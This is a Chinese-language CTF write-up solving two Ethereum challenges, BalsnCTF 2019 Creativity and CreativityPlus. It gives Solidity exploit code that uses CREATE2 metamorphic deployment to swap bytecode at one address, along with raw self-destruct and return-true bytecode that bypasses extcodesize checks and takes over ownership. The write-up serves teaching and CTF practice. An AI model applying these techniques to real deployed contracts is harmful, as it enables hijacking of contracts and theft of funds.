> 原文链接: https://www.anquanke.com//post/id/240015 


# 第五空间 CreativityPlus &amp; BalsnCTF 2019 Creativity


                                阅读量   
                                **130013**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t012e799d0d3948c4d5.png)](https://p3.ssl.qhimg.com/t012e799d0d3948c4d5.png)

两道一致考点的CTF题目，放在一起进行讨论。

首先先看 BalsnCTF 的题目。<br>
题目给出了下面的代码。

```
pragma solidity ^0.5.10;

contract Creativity `{`
    event SendFlag(address addr);

    address public target;
    uint randomNumber = 0;

    function check(address _addr) public `{`
        uint size;
        assembly `{` size := extcodesize(_addr) `}`
        require(size &gt; 0 &amp;&amp; size &lt;= 4);
        target = _addr;
    `}`

    function execute() public `{`
        require(target != address(0));
        target.delegatecall(abi.encodeWithSignature(""));
        selfdestruct(address(0));
    `}`

    function sendFlag() public payable `{`
        require(msg.value &gt;= 100000000 ether);
        emit SendFlag(msg.sender);
    `}`
`}`
```

目标是触发SendFlag() ,但是很明显 10000000 ether是很难做到的。但是他这里给出了一个<br>`excute()`方法，这里可以任意调用target 地址合约的内容。<br>
那么就是寻找如何改变target的地址 从而成为我们自己本身的恶意合约地址。

这里有一个`check`方法，可以满足更改target地址的情况。<br>
但是一定要满足合约里的bytecode &gt;0 且 &lt; = 4<br>
才能成功更改。 我们知道 四个指令以下做到触发事件是不可能的。<br>
所以这里只能考虑 是否能在check之前使得合约满足条件,check之后让其改变呢。

那么这里就引入了新的合约创建方法 `create2`

这里我粘贴官方手册create2的用法。

[![](https://p0.ssl.qhimg.com/t01442ddb240bfa2985.png)](https://p0.ssl.qhimg.com/t01442ddb240bfa2985.png)

而create2 合约地址的计算如下

```
keccak256 (0xff ++ address ++ salt ++ keccak256 (init_code)) [12:]
```

salt为自己加盐，和正常的一些加密方式加盐相同含义。 init_code是自己的字节码。 address 是部署合约的地址。

但是我们init_code 是不同的，这里又有了一种较为神奇的方法。最初是由ethscan上被检测，然后公开了代码

```
https://ropsten.etherscan.io/address/0xb3ecef15f61572129089a9704b33d53f56991df8?__cf_chl_captcha_tk__=bb3c99eeb7468e5a569bd45cdfc3d360c3637bde-1620024594-0-AY2IJmwx8s_mLtqg5_QT9Ov6Z1tfJO2mnoC0__p5ib1qw9pYRJeEX4hri0UJ_dhf7fRwdS5OQ5Te5haOpfQCsXlx-HHM8k20PsgHoxS2XoI2z-UHNs1-AmU6CKTvoHl_26hzSbrE5lg2XjXyMJQuuDD6da3RibxdODEkLFwhamSEkaL366HehUh2oEAfBgd5vGSCh64vtFNKq_FmA4yjfd8RHovYGemB-kI0EISbiGVHkWnhARmh1LHjTp64Yd_oR6dT8z18wDcez6qewWZLePYhP0cG5XN610arcUgEzRsgwETWk-twMaQtN1duk5QNOv2owGOxBJODcbZQeTxj0ni29zmaaIcvLL_wL4bPpYExi6ouhMtYDqfq3Z7qijKoGcTiantR965Fb65y4GCDI3mgHriQzMp46XZsny0AQi56wruToL9E76Ozpwisy5k3Ms8RnpqnIzF6mAOefuMuvHf3VFeoGsJVYzR6jG92HV7jiQSnwPST02kG6x9_O4olzDQhjwsx-I-4S_3qAO6G2vBZt_vbTk4YZd9CpBIdShWlmkVa6Pbzit93YT-i1Lz4htGwNNvpCRCJunTo22lWo8rpTiDh7dB3sot4mJeVYYgWXhyqiL8-E9PUXTlggN-IMOavFP7lI2zZ1mCJdJPok16uuUFas3p-6v1-047HraCtPJ_seKL5voViO8xP2pKCVKXxgk-BN1Hs2rgYyhNXHmQww4BdD2A1ZPXS1ZKvd5ox#code
```

后来这里就被整理出来代码为如下

```
pragma solidity ^0.5.10;

contract Deployer `{`
    bytes public deployBytecode;
    address public deployedAddr;

    function deploy(bytes memory code) public `{`
        deployBytecode = code;
        address a;
        // Compile Dumper to get this bytecode
        bytes memory dumperBytecode = hex'6080604052348015600f57600080fd5b50600033905060608173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b158015605c57600080fd5b505afa158015606f573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052506020811015609857600080fd5b81019080805164010000000081111560af57600080fd5b8281019050602081018481111560c457600080fd5b815185600182028301116401000000008211171560e057600080fd5b50509291905050509050805160208201f3fe';
        assembly `{`
            a := create2(callvalue, add(0x20, dumperBytecode), mload(dumperBytecode), 0x8866)
        `}`
        deployedAddr = a;
    `}`
`}`

contract Dumper `{`
    constructor() public `{`
        Deployer dp = Deployer(msg.sender);
        bytes memory bytecode = dp.deployBytecode();
        assembly `{`
            return (add(bytecode, 0x20), mload(bytecode))
        `}`
    `}`
`}`
```

DumpBytecode就是 下面的dumper 合约，当constructor的时候他会读取真正部署的字节码。然后返回去。所以这样就可以满足每次部署的Bytecode相同了。<br>
这样也就完成了骚操作。也就是能够把两个完全不同的字节码部署到同一个地址。<br>
当然第二次部署前这个合约要销毁。

那么这里首先考虑是如何销毁，肯定会想到Selfdestruct<br>
然后随便给个地址就可以了。但是没有额外的字节码允许push，最好直接找一个能返回值的指令。发现可以找tx.origin,或者是 msg.sender<br>
于是可以构造如下字节码<br>`0x32ff | 0x33ff`

这样就可以成功的部署和通过check，随后给该合约发一个空交易。或者一个单纯的转账操作。也可以完成它的自毁。

最后我们所需要做的就是触发SendFlag事件，这里不会写字节码 or 觉得写字节码麻烦就可以直接写一个合约触发，然后remix上直接dumpbytecode即可。

接下来分析第五空间的CreativityPlus。



## CreativityPlus

给源码

```
pragma solidity ^0.5.10;

contract CreativityPlus `{`
    event SendFlag(address addr);

    address public target;
    address public owner;
    uint randomNumber = RN;

    constructor() public `{`
        owner = msg.sender;
    `}`

    modifier onlyOwner()`{`
        require(msg.sender == owner);
        _;
    `}`

    function check(address _addr) public `{`
        uint size;
        assembly `{` size := extcodesize(_addr) `}`
        require(size &gt; 0 &amp;&amp; size &lt;= 4);
        target = _addr;
    `}`

    function execute() public `{`
        require( target != address(0) );
        address tmp;
        uint size;
        assembly `{` 
            tmp := and(sload(0),0xffffffffffffffffffffffffffffffffffffffff)
            size := extcodesize(tmp) 
        `}`
        require( size &gt; 0 &amp;&amp; size &lt;= 10);
        (bool flag, ) = tmp.call(abi.encodeWithSignature(""));
        if(flag == true) `{`
            owner = msg.sender;
        `}`
    `}`

    function payforflag() public payable onlyOwner `{`
        emit SendFlag(msg.sender);
        selfdestruct(msg.sender);
    `}`
`}`
```

前面的check还是一样的，但是最后还进行了一个10字节的check，需要你返回一个 真值。这里其实是ethernaut的一个challenge的 就是10字节部署的字节码能返回一个值。

[![](https://p5.ssl.qhimg.com/t01ca39025a5ba8e2b1.png)](https://p5.ssl.qhimg.com/t01ca39025a5ba8e2b1.png)

把2a 改成01就行了。

```
6001  PUSH1 0x01
6080  PUSH1 0x80
52    Mstore
6020  PUSH1 0x20
6080  PUSH1 0x80
f3    return
```

`0x600160805260206080f3` 部署一下<br>
调用excute函数就可以了。
